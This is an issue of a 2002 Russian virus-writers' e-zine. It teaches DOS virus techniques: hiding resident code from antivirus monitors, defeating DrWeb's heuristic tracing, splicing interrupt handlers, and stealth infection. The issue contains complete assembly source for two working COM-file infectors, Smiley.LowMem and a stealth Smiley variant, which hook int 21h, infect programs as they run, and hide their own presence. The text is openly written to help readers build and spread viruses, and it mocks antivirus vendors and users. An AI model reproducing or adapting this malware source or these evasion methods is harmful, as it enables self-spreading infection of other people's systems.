
                      -=POWER HEAP RESEARCH=-
          =>независимая оpганизация наyчных исследований<=

 ▀▀▀▀▀▀ ▀▀▀   ▀▀ ▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀   ▀▀▀▀▀  ▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀ ▀▀▀▀▀▀
   ▀▀   ▀▀▀▀  ▀▀ ▀▀      ▀▀       ▀▀   ▀▀    ▀▀    ▀▀      ▀▀   ▀▀
   ▀▀   ▀▀ ▀▀ ▀▀ ▀▀▀▀▀   ▀▀▀▀▀   ▀▀▀         ▀▀    ▀▀▀▀▀   ▀▀   ▀▀▀
   ▀▀   ▀▀  ▀▀▀▀ ▀▀      ▀▀       ▀▀   ▀▀    ▀▀    ▀▀      ▀▀   ▀▀
 ▀▀▀▀▀▀ ▀▀   ▀▀▀ ▀▀      ▀▀▀▀▀▀▀   ▀▀▀▀▀     ▀▀    ▀▀▀▀▀▀▀ ▀▀▀▀▀▀

           ▀▀▀▀▀▀▀       ▀▀▀▀▀▀  ▀▀   ▀▀ ▀▀▀▀▀▀    ▀▀▀▀▀
           ▀▀            ▀▀   ▀▀ ▀▀   ▀▀ ▀▀   ▀▀  ▀▀
           ▀▀▀▀▀   ▀▀▀▀▀ ▀▀▀▀▀▀  ▀▀   ▀▀ ▀▀▀▀▀▀  ▀▀▀  ▀▀▀▀
           ▀▀            ▀▀   ▀▀ ▀▀   ▀▀ ▀▀  ▀▀   ▀▀   ▀▀
           ▀▀▀▀▀▀▀       ▀▀▀▀▀▀   ▀▀▀▀▀  ▀▀   ▀▀   ▀▀▀▀▀
                       Helloween.virus@mail.ru
                    http://www.helloween.boom.ru
                      http://www.rezus.boom.ru

                        [ЖУРHАЛ  ВИРМЕЙКЕРОВ]

                    ┌───────────────────────────┐
                    │Hомеp 5 за 2002  (номеp 10)│
                    └───────────────────────────┘


    Как стать резидентом чтобы гадкие мониторы не реагировали?

  Это уже сложнее, так как различные мониторы  используют  разную
технологию определения уменьшения свободной памяти. Одним из  вы-
ходов является использование UMB, как это было описано выше.  По-
тому что большинство существующих мониторов эту память не  прове-
ряют (ну тонка кишка:). Еще одним принципиальным решением являет-
ся использование EMS и XMS, то бишь дополнительной и  расширенной
памяти. Более подробно это описано в Infected Moscow #1. А основ-
ная идея в том, что большинство мониторов имеют некоторое порого-
вое значение изменения  памяти,  например,  20h  параграфов  (512
байт), при уменьшении на меньше которого  они  не  реагируют.  То
есть если занять, допустим, 300 байт, а 4к держать в  расширенной
памяти и подгружать в случае необходиомсти,  то  это  не  вызовет
приступа у  монитора.  Третим  вариантом  является  использование
неиспользуемых участков в памяти. К таким относятся часть  табли-
цы векторов прерываний и  область  загрузки.  Фирма  IBM  сделала
большой подарок технокрысам, зарезервировав  часть  векторов  для
исключительно личных нужд. Да-да, откройте Interrupt List и  пос-
мотрите, что int 81h-EFh зарезервированы под интерпритатор бейси-
ка и другие программы их не используют. А это целых 440 байт. Там
(с некоторым риском) можно уместить небольшой кусок кода.  Второй
упомянутой мною областью является область загрузки. Это 256  байт
с 0000:0600h по 0000:0700h (или если  угодно  0060:0000-0070:0000
:) Туда загружается MBR при включении компьютера и никогда больше
не используется. Еще одним  препятствием  является  эвристический
анализ DrWeb'а Проблема в том, что это глюкало выполняет  трасси-
ровку прерываний, и если на пути встретится блок,  который  лежит
не как все в начале, а в конце, то дико  вопит.  Если,  например,
оставить резидент с помощью вышеприведенного примера и включить в
него обработчик int 21h, то его сразу обнаружит web. Что  делать?
Для этого достаточно сделать так, чтобы веб до него  в  пошаговом
режиме не дошел. Как? Элементарно. Надо  оставить  в  памяти  два
куска - один основной в конце памяти как и раньше, а второй в од-
ной из свободных областей, который детектирует проход  в  пошаго-
вом режиме и подсовывает вебу реальный обработчик прерывания, тем
самым не давая дойти до основной копии. Некоторые вирмейкеры  от-
лавливают проход в пошаговом режиме с помощью  всяких  выкрутасов
со флагами, конвейером и прочими, а я поступаю проще - переназна-
чаю адрес int 1, то есть если включен пошаговый pежим,  то  сразу
выполнится наша процедура. Вот и маленький  но  полезный  кусочек
кода :-)

         0000:0600: 6650                push eax
         0000:0602: 66B828060000        mov eax,00000628
         0000:0608: 662E87060400        xchg dword ptr cs:[0004],eax
         0000:060E: 662E87060400        xchg dword ptr cs:[0004],eax
         0000:0614: 6658                pop eax
         0000:0616: EB0B                jmp short 0623
         0000:0618: 2EC60617060B        mov byte ptr cs:[0617],0B
         0000:061E: EA01010101          jmp 0101:0101
         0000:0623: EA02020202          jmp 0202:0202
         0000:0628: 2EC606170600        mov byte ptr cs:[0617],00
         0000:062E: CF                  iret

  теперь достаточно скопировать эти 47 байт по адресу  0000:0600,
установить адрес int 21h на начало, по адресу 061F (то бишь вмес-
то 01010101) записать адрес старого обработчика, а по адресу 0624
(вместо 02020202) поставить адрес вирусного обработчика  прерыва-
ния. Все! Веб молчит. Всякие прочие антивирусные сканеры его так-
же не заметят. Но вам может показаться, что сидеть в  этом  месте
опасно? да, Данилофф когда-нибудь догадается  о  тайном  значении
этого адреса и что? А ничего! Мы можем с большим  успехом  помес-
тить эту проверку и в другой области. Какой? А, к примеру,  зате-
реть часть самого первого environment'а у comman.com  или  у  ка-
кой-нибудь резидентной программы. Там  ведь  все  равно  хранится
всякая лабуда типа Path, Comspec, Prompt, имя программы,  которые
не используются, когда программа уже резидентна. То есть мы пара-
зитируем на резидентах! Эксперименты по этому поводу  я  оставляю
на ваше самостоятельное изучение, должны же вы в конце концов де-
лать что-то сами ;)

             Как стать резидентом в нижних адресах памяти?

  Итак, рассмотрим ситуацию, когда зараженная программа заускает-
ся. До программы в нижней памяти будут находится  системные  дан-
ные системы и резиднты, а программе выделится фрагмен во всю  ос-
тавшуюся память:


            0000 ┌────────────┐
                 │    DOS     │
                 ├────────────┤
                 │ Resident 1 │
                 ├────────────┤
                 │ Resident 2 │
                 ├────────────┤
                 │ Resident 3 │
                 ├────────────┤
                 │ Program    │
                 │            │
                 │            │
                 │            │
                 │            │
                 │            │
                 │            │
            A000 └────────────┘


        Теперь вспомним, как мы остаемся резидентом из вируса -
        мы уменьшаем блок памяти и копируем тело в конец памяти:


            0000 ┌────────────┐
                 │    DOS     │
                 ├────────────┤
                 │ Resident 1 │
                 ├────────────┤
                 │ Resident 2 │
                 ├────────────┤
                 │ Resident 3 │
                 ├────────────┤
                 │ Program    │
                 │            │
                 │            │
                 │            │
                 │            │
                 ├────────────┤
                 │   Virus    │
            A000 └────────────┘

  Неудивительно, что при таком раскладе  вирус  очень  заметен  в
дампе. Наша задача заключается в том, чтобы сесть по  порядку  за
резидентами, не испортив самой программы:

            0000 ┌────────────┐
                 │    DOS     │
                 ├────────────┤
                 │ Resident 1 │
                 ├────────────┤
                 │ Resident 2 │
                 ├────────────┤
                 │ Resident 3 │
                 ├────────────┤
                 │   Virus    │
                 ├────────────┤
                 │  Program   │
                 │            │
                 │            │
                 │            │
                 │            │
            A000 └────────────┘

  Для этого есть два похожих способа, которые зависят  от  метода
заражения программы. Если наш вирус  приписывает  себя  к  началу
программы, то при загрузке зараженной программы вирус как бы  уже
находится на нужном месте и нам следует только настроить  окруже-
ние программы так будто она загружена отдельно.  Это  можно  сде-
лать вручную путем всяческих выкрутасов с блоками, PSP и  прочими
гадостями, а можно сделать проще - повторно запустить  эту  прог-
рамму. Вирус-то ведь уже резидентен, поэтому вторая копия  просто
вылечит основную программу и передаст ей управление. Сложнее  об-
стоит дело если вирус дописывается в конец или середину.  Но  не-
намного. Мы просто пересылаем себя в нужное место и передаем  уп-
равление копии, которая сидит там где надо, освободив старый  ку-
сок:

            0000 ┌────────────┐
                 │    DOS     │
                 ├────────────┤
                 │ Resident 1 │
                 ├────────────┤
                 │ Resident 2 │
                 ├────────────┤
                 │ Resident 3 │
                 ├────────────┤
                 │   Virus  ───┐
                 ├────────────┤ │
                 │            │ │
                 │            │ │
                 │            │ │
                 ├────────────┤ │
                 │   Virus  ────┘
            A000 └────────────┘

        Ну, надеюсь, вы поняли идею. Как уже повелось добавим
        процедуру резидентности к нашему старенькому Smiley.
        Наш новый :) вирь назовем Smiley.LowMem:

        Да, замечу, что основная сложность здесь состоит в правильном
        поиске имени запущенной программы и передаче всех параметров
        на вторую копию.

        .model tiny
        .386
        .code
        .startup
        org 100h

        _real   equ _end - _beg                 ;Это размер вируса
        _size   equ (_real+100h+15+64+16+256)/16
                                        ;Это размер вируса в параграфах
                                        ; 64 байта мы резервируем под имя
                                        ; программы, 16 под струкутуру Exec
                                        ; а 256 под собственный стек.
                                        ; Ну а еще 100h потому как перед
                                        ; самим вирусом остается место.

_beg:
        mov ax,1E03h    ; самым первым делом проверяем собственную
        int 21h         ; резидентность.
        cmp ax,031Eh
        jz _Already
;
;       Мы запускаемся впервые. Надо остаться резидентом.
;       В первую очередь вытаскиваем из окружения имя программы. RTFM.
;
        mov ds,ds:[2Ch]
        xor si,si
@l2:    lodsb
        or al,[si]
        jnz @l2
        lodsb
        lodsw
        mov cl,32
        lea di,_ProgName
        rep movsw

        lea di,_ExecParam
        xchg ax,cx              ; cx=0 после rep. А так как xchg ax,cx
        stosw                   ; занимает 1 байт, а xor ax,ax - 2, то
                                ; очевидно экономим :)
        push cs
        pop ds

        ; А в этом фрагменте мы заполняем структкуру Exec, необходимую
        ; для запуска программы. Догадались в чем хитрость? Мы передаем
        ; все параметры основной программы просто ссылкой на них.

        mov ax,80h
        stosw
        mov ax,cs
        stosw
        mov ax,5Ch
        stosw
        mov ax,cs
        stosw           ; Все, мы создали все структуры данных для
        mov ax,6Ch      ; повторного запуска программы.
        stosw           ; Теперь можно заняться собственной персоной.
        mov ax,cs
        stosw

        mov sp,_Stack   ; Нам нужно резервировать собственный стек,
                        ; так как стек программы затирается.
                        ; Вообще желательно всегда работать в своем стеке.

        mov bx,_size    ; отрезаем от себя ненужный хвост во всю
        mov ah,4Ah      ; оставшуюся память :)
        int 21h

        push 0          ; теперь перехватываем прерывания.
        pop ds
        mov ax,_int21
        mov bx,cs
        xchg ax,ds:[84h]
        xchg bx,ds:[86h]
        push cs
        pop ds
        mov ds:_go21o,ax
        mov ds:_go21s,bx

        lea dx, _ProgName
        lea bx, _ExecParam
        mov ax,4B00h            ; запускаем программу. Вообще-то лучше
        int 21h                 ; сделать это по старому вектору, ну
                                ; да ладно.

        mov ax,cs               ; Программа завершилась. Восстановим стек.
        mov ss,ax
        lea sp,_stack

        mov ah,4Dh      ; Тоже нужный момент - срхранение кода возврата.
        int 21h

        mov ah,31h
        mov dx,_size
        int 21h

_Already:           ; Сюда приходим в случае резидентности вируса.
                    ; нам надо вылечить программу и передать ей управление.
        mov si,0FDh
        mov word ptr ds:[si],0A5F3h
        mov byte ptr ds:[si+2],0C3h

        mov di,100h     ; заталкиваем в стек адрес запуска программы.
        push di

        push si         ; адрес лечилки. Она выполняет команды rep movsw/retn
                        ; Вы можете поинтересоваться зачем нужен retn, тогда
                        ; как следующий байт и есть начало программы.
                        ; А все потому что в процессоре есть конвейер и
                        ; будут выполняться совсем не те байтики :)

        mov si, _end
        mov cx,32000
        retn

;---------------- Дальше все идет как в базовом вирусе -----------

_check:
        xchg ah,al
        iret

_int21:
        cmp ax,1E03h    ; проверка на резидентность.
        jz _check
        cmp ah,4Bh      ; заражаем при запуске
        jnz _go
        cld
        pusha
        push es
        push ds
        mov cx,256
        xor al,al
        mov di,dx
        push ds
        pop es
        repnz scasb
        jnz _noinfect
        mov si,di               ; COMMAND.COM заражать нельзя
        sub si,12
        lodsd
        and eax,0DFDFDFDFh      ; приводим к заглавным буквам
        cmp eax,'MMOC'
        jnz _infect
        lodsw
        and ax,0DFDFh
        cmp ax,'NA'
        jz _noinfect
_infect:
        mov ah,48h      ; выделяем для своих нужд 64к памяти
        mov bx,4096
        int 21h
        mov es,ax
        jnc _inf1
        mov ah,49h
        int 21h
        jmp short _noinfect
_inf1:
        mov ax,3D02h
        int 21h
        jc _noinf2
        xchg ax,bx
        push es
        pop ds
        xor dx,dx
        mov cx,-1
        mov ah,3Fh
        int 21h
        cmp word ptr ds:[0],'MZ'        ; EXE тоже не заражаем.
        jz _noinf
        cmp word ptr ds:[0],'ZM'
        jz _noinf
        cmp word ptr ds:[_sig - _beg],'):'      ; проверка на зараженность
        jz _noinf
        cmp ax,64000
        jnc _noinf
        push ax
        push ds

        xor cx,cx
        xor dx,dx
        mov ax,4200h
        int 21h
        mov cx,_real    ; записываем вирус.
        push cs
        pop ds
        mov dx,100h
        mov ah,40h
        int 21h
        pop ds
        pop cx
        xor dx,dx       ; записываем программу
        mov ah,40h      ; кстати, мы не сохраняем атрибутов и даты
        int 21h         ; файла, а это делать надо. Кроме того,
                        ; желательно перехватывать int 24 для
                        ; погашения критических ошибок (например,
                        ; запись на дискетку с защитой от записи)
_noinf: mov ah,3Eh
        int 21h
_noinf2:
        mov ah,49h      ; освободили память
        int 21h
_noinfect:
        pop ds
        pop es
        popa
_go:
        byte 0EAh       ; Команда JMP FAR
_go21o  dw 0
_go21s  dw 0
_sig    byte ':)'

_end:

_ExecParam:                                     ; Ну это структуры данных.
_ProgName       equ _ExecParam +16              ; Они не таскаются по
_Stack          equ _ExecParam +16+64+254       ; зараженым копиям.

        mov dx,_msg-_end+100h
        mov ah,9
        int 21h
        mov ax,4c00h
        int 21h
_msg    db 'Вирус Smiley.LowMem стартовал',13,10,36

end


       Как перехватить прерывание чтоб мониторы не реагировали?

  Это уже нетривиальная задача, так как опять-таки различные  мо-
ниторы используют различные методы проверок. Основной метод - за-
поминание текущего адреса и проверка его после запуска  очередной
программы. Таким образом, если запустить зараженную программу, то
она поменяет адрес вектора и монитор это сразу заметит.  Как  бо-
роться с этой проблемой? очевидно что нужно перехватить  прерыва-
ние так, чтобы оно было перехвачено, но адрес первого  обработчи-
ка не изменился. Как это сделать? Для этого  достаточно  заменить
первые несколько байт обработчика прерывания на  собственный  вы-
зов, а потом при передаче управления эти байтики восстановить.

  Поясню графически:

  То есть наша задача - сделать так, чтобы наш  обработчик  вызы-
вался из середины цепочки обработчиков. Например, если у нас есть
несколько резидентов, которые перехватывают прерывание int 21h:


┌──────────────┐   ┌──────────────┐   ┌──────────────┐   ┌───────┐
│ Обработчик 1 ├───┤ Обработчик 2 ├───┤ Обработчик 3 ├───┤  DOS  │
└──────────────┘   └──────────────┘   └──────────────┘   └───────┘

  То нам надо сделать так, чтобы вирус вызывался после того,  как
отработает один из них:

┌──────────────┐   ┌──────────────┐   ┌──────────────┐   ┌───────┐
│ Обработчик 1 ├┐ ┌┤ Обработчик 2 ├───┤ Обработчик 3 ├───┤  DOS  │
└──────────────┘│ │└──────────────┘   └──────────────┘   └───────┘
                │ │
            ┌───┘ └───┐
            │┌───────┐│
            └┤ Virus ├┘
             └───────┘

  Очередной неплохой идеей является встраивание вируса после  то-
го как отработают все обработчики. Почему? Потому  что  одним  из
этих обработчиков может быть сам монитор, делающий всякие  пакос-
тные и непредсказуемые проверки.

┌──────────────┐   ┌──────────────┐   ┌──────────────┐   ┌───────┐
│ Обработчик 1 ├───┤ Обработчик 2 ├───┤ Обработчик 3 ├┐ ┌┤  DOS  │
└──────────────┘   └──────────────┘   └──────────────┘│ │└───────┘
                                                      │ │
                                                  ┌───┘ └───┐
                                                  │┌───────┐│
                                                  └┤ Virus ├┘
                                                   └───────┘
  Итак, что же от нас, наконец, требуется?  Нам  надо  проследить
ход выполнения вызова, поймать то место, откуда  вызывается  само
ядро системы. То есть как будто бы мы загрузили  отладчик,  вруч-
ную прошли по всем обработчикам и дошли до DOS. Как это сделать в
вирусе? Очень просто - ведь в процессоре  есть  режим  пошагового
выполнения, в котором после каждой команды вызывается int 1.  Нам
только остается перехватить int 1, включить пошаговый режим,  пе-
редать управление обработчику прерывания и пройти в пошаговом pе-
жиме до самого ядра и заменить первые несколько байт  в  ядре  на
JMP FAR. Здесь есть сразу несколько замечаний:

  1) Команды int XX сбрасывают флаг пошагового режима, поэтому  в
нашем обраотчике необходимо проверять на вызов прерывания и  эму-
лировать его с помощью таблицы векторов.

  2) Адрес следующей инструкции равно как и адрес возврата из int
1 хранится в стеке. Чтобы изменить адрес следующей  команды  надо
просто изменить этот адрес - это к вопросу об эмуляции int.

  3) Чтобы определить относиться ли выполняемый код  к  ядру  или
нет надо проверить его адрес - DOS находится в адресах  0070  или
FFFF (HMA). Но кроме этого лучше проверить еще и проверкой  лежит
ли текущий сегмент до первого блока MCB. А  адрес  первого  блока
MCB можно узнать через int 21/ah=52h

  Итак, мы прошлись по цепочке обработчиков и поставили  FAR  JMP
или INT xx (неиспользуемое прерывание) вместо кода  ядра  (старые
байтики сохранить не забыли?;). Когда произойдет  вызов  прерыва-
ния и все мерзкие мониторы сделают свои идиотские прверки  управ-
ление передастся нашему вирусу, и он может делать свои темные де-
лишки. Но:

  1) Если вирус сидит на int 21 то в процессе работы ему  понадо-
биться вызывать настоящий int 21. А там опять  мы  :(  Для  этого
очевидно надо в самом начале нашего обработчика восстановить  эти
чертовы байтики.

  2) Если в процессе работы надо вызывать прерывания,  то  делать
это лучше сразу по адресу ядра - таким образом мы избавляемся  от
риска, что наш вызов возбудит резидентный монитор, но рискуем по-
лучить жопу если не вызовем архиважный резидентный и дико  кривой
драйвер. В конечном итоге безопасность работы - это проблема это-
го драйвера и монитора, а мы можем смело положить на них обоих :)

  3) После того как мы отработали надо полностью передать  управ-
ление ядру. Но ведь если мы передадим управление с исходными бай-
тиками, то больше никогда не вызовемся и с другой стороны  нельзя
испрявлять их раньше вызова иначе укусим себя за  хвост.  Решение
просто - восстанавливаем исходные байты, включаем  пошаговый  ре-
жим и проходим первые две-три команды в пошаговом режиме (пока не
выйдем за опасную  зону),  а  потом  опять  вставляем  свой  JMP.
Остается отключить поаговый режим и выполнить обработку  на  пол-
ной скорости.

  Для тех, кому выполнять  проход  по  цепочке  сложновато  можно
предложить сделать промежуточное - поставить JMP на первом же об-
работчике и не заботиться о сложных  выкрутасах  с  вызовом  int,
проверкой ядра и т.п. А вот проход превых команд обработчика при-
дется оставить.

 Все описанное называется Сплайсинг. Я изложил только  идею.  Но-
вичкам это не особенно нужно, да и тяжеловато, а для  продвинутых
уже есть готовая статья и кусок кода в IV1 и IV7.


                      Вирусы-невидимки.

  Итак, что же такое стелс ака вирус-невидимка? Это такой  вирус,
который будучи активным скрывает свое  присутствие  в  зараженных
файлах. Как это делается? Вирус перехватывает все функции  работы
с файлами и если операция выполняется над зараженным  файлом,  то
вирус подставляет вместо зараженного файла вылеченный. Делать это
можно по крайней мере двумя способами - лечить на лету,  то  есть
при каждом обращении к файлу производить лечение куска в памяти и
возвращать его. А можно вылечить программу в некоторый  временный
файл и работать с ним. Кроме того, не слудет забывать  не  только
про функции работы с файлами, но и про функции чтения каталога  -
там ведь хранится их длина, так что скрыть реальную  длину  файла
тоже придется :) Ну что-то заболтался я. Вот собственно наш  ста-
ренький Smiley,  с  небходимыми  дополнениями,  который  является
стелсом, используя второй способ.

        .model tiny
        .386
        .code
        .startup
        org 100h

        _real   equ _end - _beg         ; Это размер вируса
        _size   equ (_real+15+18)/16    ; Это размер вируса в параграфах
                                   ; 18 байт резервируем под временный файл
_beg:
        mov ax,cs
        dec ax
        mov ds,ax
        mov bx,ds:[3]
        sub bx,_size+1
        mov ah,4ah
        int 21h
        mov bx,_size
        mov ah,48h
        int 21h

        push cs
        pop ds
        sub ax,10h
        mov es,ax
        mov di,100h
        mov si,di
        push cs
        push di
        mov cx,_real
        rep movsb
        push es         ; Теперь передаем управление резидентной
        push _res       ; части.
        retf

_res:
        pop di
        push di
        mov cx,32000
        push ds
        pop es
        rep movsw
        mov ax,1E03h
        int 21h
        cmp ax,031Eh
        jz _no
        mov ds,cx
        mov ax,_int21
        mov bx,cs
        xchg ax,ds:[84h]
        xchg bx,ds:[86h]
        push cs
        pop ds
        mov ds:_go21o,ax
        mov ds:_go21s,bx
        mov word ptr ds:[0F1h],8
        mov _hnd,4141h
_no:
        push es
        pop ds
        retf
_check:
        xchg ah,al
        iret

_int21:                 ; собственно наш обработчик int 21
        cmp ax,1E03h    ; проверка на резидентность
        jz _check
        cmp ah,3Dh      ; Если закоментировать эти два перехода, то
        jz _Open        ; вирус не будет стелсом на уровне чтения из
        cmp ah,3Eh      ; файла
        jz _Close

        cmp ah,4Fh      ; а если закоментировать это, то вирус не
        jz _Search      ; будет стелсом на уровне поиска в каталоге
        cmp ah,4Eh      ; логично, правда? ;)
        jz _Search

        cmp ah,4Bh      ; заражаем фалы при запуске
        jnz _go

        cld
        pusha
        push es
        push ds

        mov cx,256
        xor al,al
        mov di,dx
        push ds
        pop es
        repnz scasb
        jnz _noinfect
        mov si,di               ; проверяем чтобы не заразить COMMAND.COM
        sub si,12
        lodsd
        and eax,0DFDFDFDFh      ; приводим к верхнему регистру.
        cmp eax,'MMOC'
        jnz _infect
        lodsw
        and ax,0DFDFh
        cmp ax,'NA'
        jz _noinfect
_infect:
        mov ah,48h              ; для того чтобы заразить файл читаем его
        mov bx,4096             ; в буфер памяти, записываем в начало
        call _OldInt            ; вирус и дописываем сам файл
        mov es,ax               ; у этого способа есть преимущество -
        jnc _inf1               ; не надо вычислять jmp'ы :)
        mov ah,49h
        call _OldInt
        jmp short _noinfect
_inf1:
        mov ax,3D02h
        call _OldInt
        jc _noinf2
        xchg ax,bx
        push es
        pop ds
        xor dx,dx
        mov cx,-1
        mov ah,3Fh
        call _OldInt
        cmp word ptr ds:[0],'MZ'        ; ехешники нельзя заражать
        jz _noinf
        cmp word ptr ds:[0],'ZM'
        jz _noinf
        cmp word ptr ds:[_sig - _beg],'):'
        jz _noinf
        cmp ax,64000                    ; слишком длинные тоже.
        jnc _noinf
        push ax
        push ds

        xor cx,cx
        xor dx,dx
        mov ax,4200h
        call _OldInt
        mov cx,_real
        push cs
        pop ds
        mov dx,100h
        mov ah,40h
        call _OldInt
        pop ds
        pop cx
        xor dx,dx
        mov ah,40h
        call _OldInt
_noinf:
        mov ah,3Eh
        call _OldInt
_noinf2:
        mov ah,49h
        call _OldInt
_noinfect:
        pop ds
        pop es
        popa

_go:
        byte 0EAh       ; Команда JMP FAR
_go21o  dw 0
_go21s  dw 0

_Search:                ; Процедура невидимости в режиме FindFirst/FindNext
        call _OldInt
        jc _exit
        pushf
        pusha
        push es
        push ds

        mov ah,2Fh      ; получаем адрес DTA
        int 21h
        push bx

        push es
        pop ds
        lea dx,[bx+1Eh] ; имя файла.
        mov ax,3D00h    ; Внимание! если задать маску поиска в другом
        xor cx,cx       ; каталоге, то открыть их будет невозможно, так
                        ; как эти файлы будут открываться в текущем.
                        ; Это не страшно для обучающего вируса, но
                        ; для правильной реализации необходимо запомнить
                        ; путь при вызове FindFirst и соединять найденный
                        ; файл и путь. Для проверки можно набрать
                        ; dir [другой путь] - будут выведены файлы без
                        ; коррекции длины.

        call _OldInt
        jc _s3
        xchg ax,bx
        call _SeekSig           ; проверяем сигнатуру
        jnz _s2
        pop bx
        push bx                         ; если это зараженный файл, то
        sub word ptr es:[bx+1Ah],_real  ; корректируем длину файла
_s2:
        mov ah,3Eh
        call _Oldint
_s3:
        pop bx
        pop ds
        pop es
        popa
        popf

_exit:  retf 2

_SeekSig:                       ; процедура проверки сигнатуры.
        lea dx,_sig - _beg      ; все понятно? ;)
        xor cx,cx
        mov ax,4200h
        call _Oldint
        jc _ss1
        push cs
        pop ds
        mov ah,3Fh
        lea dx,tmp
        mov cx,2
        call _Oldint
        byte 0B8h       ; mov ax, ... - значение читаем прямо из файла
        tmp word 0
_ss1:
        cmp ax,'):'
        retn

_Open:                  ; стелс по чтению. Самое глючное и геморойное.
        call _oldInt
        jc _exit

        pushf
        pusha
        push ds

        xchg ax,bx
        call _SeekSig
        jnz _o1

        lea dx,path     ; генерируем случайно имя файла в 'c:\'
        mov di,dx
        push es
        push cs
        pop es
        cld
        mov eax,'\:C'
        stosd
        mov cx,7
        xor ax,ax
        rep stosw
        pop es

        mov ah,5Ah
        call _oldInt
        mov _hnd,ax
        xchg si,ax      ; теперь path содержит имя, а si его дескриптор

        push 0
        pop ds
        mov dx,600h     ; используем 100h байт в 0000:0600 в качестве
_o3:    mov cx,256      ; буфера обмена - копируем зараженный файл без
        mov ah,3Fh      ; вируса во временный.
        call _oldInt
        test ax,ax      ; до тех пор, пока есть что читать из файла
        jz _o4
        xchg ax,cx
        xchg si,bx
        mov ah,40h
        call _oldInt
        xchg bx,si
        jmp _o3
_o4:
        mov ah,3Eh      ; закроем зараженный файл
        int 21h
        xchg bx,si      ; устанавливаем указатель на 0 и возвращаем
        call _SeekZero  ; дескриптор временного

        pop ds
        popa
        popf
        mov ax,cs:_hnd
        retf 2

_o1:    call _SeekZero  ; это не зараженный файл - ничего не делаем
        pop ds
        popa
        popf
        retf 2

_SeekZero:              ; процедура устнаовки указателя на 0
        xor cx,cx
        mov ax,4200h
        cwd
        call _Oldint
        retn

_Close:                         ; закрытие файла.
        byte 81h,0FBh   ; cmp bx,_hnd
        _hnd    dw 4141h

        jnz _go         ; внимание! Этот пример не будет правильно
        call _OldInt    ; работать если одновременно открыть два
        jc _c2          ; зараженных файла. Для рабочей версии
        pushf           ; необходимо хранить динамический список
        pusha           ; открытых файлов.
        push ds
        lea dx,path
        push cs
        pop ds
        mov ah,41h      ; удаляем временный файл.
        mov _hnd,ax
        xor cx,cx
        call _OldInt
        pop ds
        popa
        popf
_c2:
        retf 2

_OldInt:                ; процедура вызова старого обработчика
        pushf
        call dword ptr cs:_go21o
        retn


_sig    byte ':)'       ; Сигнатура зараженности.

path:                   ; здесь будет хранится путь для временного файла

_end:
        mov dx,_msg- _end+100h
        mov ah,9
        int 21h
        mov ax,4c00h
        int 21h
_msg    db 'Вирус стартовал',13,10,36

end

        Сразу хочу заметить несколько недостатков этого вируса:

        1) Не сохраняет даты и атрибутов
        2) Не перехватывает критических ошибок int 24
        3) Не позволяет открывать несколько зараженных файлов
        4) Не скрывает своего присутствия в памяти
        5) Не содержит антиотладочных и антиэвристических приемов.
        6) Алгоритм стелсирования не стелсирует функции FCB и
           расширенное открытие (ax=6C00).
        7) При чтении каталога стелсируются файлы только
           в текущем каталоге.

    Но тем не менее несмотря на кучу недостатков этот зверек работает :)

  Да, кстати, я не сказал про бутовые стелсы. Но вы наверное  уже
догадались :) Идея в том, что при чтении зараженного  бута  вирус
подставляет исходный бут, а при чтении сектора где  вирус  хранит
свое тело он возвращает нули, ну и записывать в  эти  сектора  не
дает :) Рисовать тут бутовый стелс мне лениво, да там и  делов-то
на 50 байт, сами справитесь ;)

  P.S. Вот все вокруг кричат стелс-стелс, а я лично  ничего  осо-
бенно замечательного в этом не вижу. С одной стороны это  конечно
хорошо, глупый юзверь нажмет F3 и ничего не заметит, но с  другой
плохо - гадкие адинфы начнут ругаться, да еще лишнюю услугу анти-
вирусникам оказываем -  вирус  содержит  готовую  работоспособную
процедуру лечения.

                                              AK